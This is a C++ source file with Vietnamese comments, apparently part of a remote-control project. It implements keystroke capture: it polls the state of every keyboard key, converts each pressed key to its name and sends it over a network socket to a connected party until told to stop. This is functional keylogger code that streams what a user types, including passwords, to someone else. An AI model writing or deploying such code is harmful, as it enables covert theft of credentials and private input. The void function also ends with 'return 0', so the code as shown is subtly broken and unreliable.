#include "key.h"

// VirtualKeyCode --> String
string keyDown::VirtualKeyCodeToString(UCHAR virtualKey) {
    UINT scanCode = MapVirtualKey(virtualKey, MAPVK_VK_TO_VSC);

    CHAR szName[128];
    int result = 0;
    switch (virtualKey)
    {
        case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
        case VK_RCONTROL: case VK_RMENU:
        case VK_LWIN: case VK_RWIN: case VK_APPS:
        case VK_PRIOR: case VK_NEXT:
        case VK_END: case VK_HOME:
        case VK_INSERT: case VK_DELETE:
        case VK_DIVIDE:
        case VK_NUMLOCK:
            scanCode |= KF_EXTENDED;
        default:
            result = GetKeyNameTextA(scanCode << 16, szName, 128);
    }
    if(result == 0)
        throw std::system_error(std::error_code(GetLastError(), std::system_category()),
                                "WinAPI Error occured.");
    return szName;
}

// Bắt phím và xuất string (Desc)
void keyDown::catchCodeAlltoString(Server* S, int id_AcSocket) {
    while (true)
    {
        // Duyệt qua tất cả các mã phím ảo từ 0x01 đến 0xFE
        // for (int vk = 0x01; vk <= 0xFE; vk++)
        for (int vk = 0x08; vk <= 0xFE; vk++) { // bỏ qua click chuột
            
            // Kiểm tra xem phím có được nhấn hay không
            if (GetAsyncKeyState(vk) & 0x8000) {
                // std::cout << "You pressed key code " << vk << "\n";
                // std::cout << "You pressed key code: " << vk << " --> " << VirtualKeyCodeToString(vk) << "\n";
                string desc = VirtualKeyCodeToString(vk);
                const char* cdesc = desc.c_str();
                S->sendSize(id_AcSocket, strlen(cdesc));
                S->sendData(id_AcSocket, cdesc);
                int flag;
                S->recvSize(id_AcSocket, flag);
                if (flag == 0) return 0;
            }
        }
        // if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) { // nếu là ESC
        //     std::cout << "You pressed ESC\n";
        //     break; // Thoát khỏi vòng lặp
        // }
        
        // Đợi 100 ms trước khi kiểm tra lại
        Sleep(100);
    }
}


